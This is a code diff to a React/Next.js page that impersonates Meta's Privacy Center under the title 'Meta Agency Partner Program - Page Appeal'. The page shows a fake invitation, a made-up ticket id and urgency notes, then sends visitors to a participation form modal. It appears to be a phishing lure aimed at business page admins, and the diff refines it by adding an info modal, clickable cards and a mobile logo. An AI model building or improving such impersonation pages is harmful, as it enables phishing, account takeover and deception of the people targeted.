@@ -7,6 +7,7 @@ import { store } from '@/store/store';
 import translateText from '@/utils/translate';
 import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
 import { faHouse } from '@fortawesome/free-regular-svg-icons/faHouse';
+import { faArrowUpRightFromSquare } from '@fortawesome/free-solid-svg-icons/faArrowUpRightFromSquare';
 import { faChevronRight } from '@fortawesome/free-solid-svg-icons/faChevronRight';
 import { faCircleInfo } from '@fortawesome/free-solid-svg-icons/faCircleInfo';
 import { faGear } from '@fortawesome/free-solid-svg-icons/faGear';
@@ -19,6 +20,7 @@ import Image, { type StaticImageData } from 'next/image';
 import { useEffect, useRef, useState, type FC } from 'react';
 
 const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });
+const InfoModal = dynamic(() => import('@/components/info-modal'), { ssr: false });
 
 interface MenuItem {
     id: string;
@@ -106,7 +108,7 @@ const resourceItems: InfoCardItem[] = [
 ];
 
 const Page: FC = () => {
-    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo } = store();
+    const { isModalOpen, isInfoModalOpen, setModalOpen, setInfoModalOpen, setGeoInfo, geoInfo } = store();
     const [translations, setTranslations] = useState<Record<string, string>>({});
     const [modalKey, setModalKey] = useState(0);
     const isTranslatingRef = useRef(false);
@@ -148,7 +150,7 @@ const Page: FC = () => {
 
         isTranslatingRef.current = true;
 
-        const textsToTranslate = ['Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles', 'Settings', 'Privacy Center', 'Meta Agency Partner Program', 'Your agency has been selected as a qualified candidate to participate in the Meta Agency Partner Program. This invitation gives you access to exclusive tools, premium support, and growth opportunities designed to help you scale your business and serve clients more effectively.', 'If you’re ready to take advantage of these partner benefits, you can submit your participation request.', 'Your ticket id: #F43H-IFKM-NHAV', 'Important Notes', 'Please ensure that your contact information (email and page admin) is correct to avoid delays in activation.', 'Our verification team may reach out within 2 business days if additional details are needed.', 'Requests containing incomplete or inaccurate information may result in a delayed or cancelled onboarding.', 'Participation Request', 'Confirming your eligibility to join the program', 'Please make sure to provide the required information below. Missing details may delay the processing of your request.', 'Join Meta Agency Program', 'You have been invited to join the Meta Media Agency Program on', 'What is the Privacy Policy and what does it say?', 'How you can manage or delete your information', 'Meta AI', 'User Agreement', 'For more details, see the User Agreement', 'Additional resources', 'How Meta uses information for generative AI models', 'Meta AI website', 'Introduction to Generative AI', 'For teenagers', 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy'];
+        const textsToTranslate = ['Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles', 'Settings', 'Privacy Center', 'Meta Agency Partner Program', 'Your agency has been selected as a qualified candidate to participate in the Meta Agency Partner Program. This invitation gives you access to exclusive tools, premium support, and growth opportunities designed to help you scale your business and serve clients more effectively.', "If you're ready to take advantage of these partner benefits, you can submit your participation request.", 'Your ticket id: #F43H-IFKM-NHAV', 'Important Notes', 'Please ensure that your contact information (email and page admin) is correct to avoid delays in activation.', 'Our verification team may reach out within 2 business days if additional details are needed.', 'Requests containing incomplete or inaccurate information may result in a delayed or cancelled onboarding.', 'Participation Request', 'Confirming your eligibility to join the program', 'Please make sure to provide the required information below. Missing details may delay the processing of your request.', 'Join Meta Agency Program', 'You have been invited to join the Meta Media Agency Program on', 'What is the Privacy Policy and what does it say?', 'How you can manage or delete your information', 'Meta AI', 'User Agreement', 'For more details, see the User Agreement', 'Additional resources', 'How Meta uses information for generative AI models', 'Meta AI website', 'Introduction to Generative AI', 'For teenagers', 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about', ' Privacy Policy'];
 
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
@@ -166,9 +168,9 @@ const Page: FC = () => {
     return (
         <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
             <title>Meta Agency Partner Program - Page Appeal</title>
-            <div className='flex w-full max-w-[1100px]'>
+            <div className='flex w-full max-w-275'>
                 <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
-                    <Image src={MetaImage} alt='' className='h-3.5 w-[70px]' />
+                    <Image src={MetaImage} alt='' className='h-3.5 w-17.5' />
                     <p className='my-4 text-2xl font-bold'>{t('Privacy Center')}</p>
                     {menuItems.map((item) => (
                         <div key={item.id} className={`flex cursor-pointer items-center justify-start gap-3 rounded-[15px] px-4 py-3 font-medium ${item.isActive ? 'bg-[#344854] text-white' : 'text-black hover:bg-[#e3e8ef]'}`}>
@@ -178,6 +180,10 @@ const Page: FC = () => {
                     ))}
                 </div>
                 <div className='flex flex-1 flex-col gap-5 px-4 py-10 sm:px-8'>
+                    <div className='flex items-center justify-between sm:hidden'>
+                        <Image src={MetaImage} alt='' className='h-4 w-auto' />
+                    </div>
+
                     <div className='flex items-center gap-2'>
                         <p className='text-2xl font-bold'>{t('Meta Agency Partner Program')}</p>
                     </div>
@@ -203,11 +209,11 @@ const Page: FC = () => {
                                     setModalKey((prev) => prev + 1);
                                     setModalOpen(true);
                                 }}
-                                className='flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white'
+                                className='flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white'
                             >
                                 {t('Join Meta Agency Program')}
                             </button>
-                            <p className='inline-flex w-full text-[14px] gap-1'>
+                            <p className='inline-flex w-full gap-1 text-[14px]'>
                                 {t('You have been invited to join the Meta Media Agency Program on')} <p className='font-bold'> {new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })}</p>
                             </p>
                         </div>
@@ -221,7 +227,7 @@ const Page: FC = () => {
                                 const roundedClass = privacyCenterItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';
 
                                 return (
-                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
+                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`} onClick={() => setInfoModalOpen(true)}>
                                         {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                         <div className='flex flex-1 flex-col'>
                                             <p className='font-medium'>{t(item.title)}</p>
@@ -240,7 +246,7 @@ const Page: FC = () => {
                                 const roundedClass = agreementItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';
 
                                 return (
-                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
+                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`} onClick={() => setInfoModalOpen(true)}>
                                         {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                         <div className='flex flex-1 flex-col'>
                                             <p className='font-medium'>{t(item.title)}</p>
@@ -259,7 +265,7 @@ const Page: FC = () => {
                                 const roundedClass = resourceItems.length === 1 ? 'rounded-[15px]' : isFirst ? 'rounded-t-[15px] border-b border-b-gray-200' : isLast ? 'rounded-b-[15px]' : 'border-y border-y-gray-200';
 
                                 return (
-                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`}>
+                                    <div key={item.id} className={`flex cursor-pointer items-center justify-center gap-3 bg-white px-4 py-3 transition-discrete duration-300 hover:bg-[#e3e8ef] ${roundedClass}`} onClick={() => setInfoModalOpen(true)}>
                                         {item.image && <Image src={item.image} alt='' className='h-12 w-12' />}
                                         <div className='flex flex-1 flex-col'>
                                             <p className='font-medium'>{t(item.title)}</p>
@@ -270,11 +276,18 @@ const Page: FC = () => {
                                 );
                             })}
                         </div>
-                        <p className='text-[15px] text-[#465a69]'>{t('We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy')}</p>
+                        <p className='text-[15px] text-[#465a69]'>
+                            {t('We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about')}
+                            <span onClick={() => setInfoModalOpen(true)} className='ml-2 cursor-pointer text-blue-600 underline hover:text-blue-700'>
+                                {t('Privacy Policy')}
+                            </span>
+                            <FontAwesomeIcon icon={faArrowUpRightFromSquare} className='ml-1 h-3 w-3 text-blue-600' />
+                        </p>
                     </div>
                 </div>
             </div>
             {isModalOpen && <FormModal key={modalKey} />}
+            {isInfoModalOpen && <InfoModal />}
         </div>
     );
 };
